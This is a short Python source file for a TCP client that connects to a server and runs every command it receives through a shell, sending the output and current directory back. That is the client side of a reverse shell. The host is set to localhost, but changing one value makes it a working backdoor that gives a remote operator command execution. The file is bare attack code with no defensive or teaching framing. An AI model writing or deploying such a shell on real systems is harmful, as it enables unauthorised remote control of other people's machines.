import os
import socket
import subprocess


# Global Variables
# s = None
# host = None
# port = None


class mySocketError(Exception):
    pass


# Create Socket
def socket_create():
    global host
    global port
    global s
    host = "localhost"
    port = 1001

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        raise mySocketError("Socket creation error...")


def socket_connect():
    global host
    global port
    global s

    try:
        s.connect((host, port))
        print("Connected to server -> IP: " + host + " | Port: " + str(port))

    except socket.error as msg:
        print(str(msg))
        raise mySocketError("Socket connection error...")


# TCP Client Protocol
def client_shell():
    global host
    global port
    global s

    # created socket
    socket_create()
    # connect to socket
    socket_connect()

    while True:
        data = s.recv(1024)

        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) >0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)  # prints on client side

    s.close()

# Main Function
if __name__ == "__main__":

    try:

        # tcp client
        client_shell()
    except mySocketError as msg:
        print(str(msg))
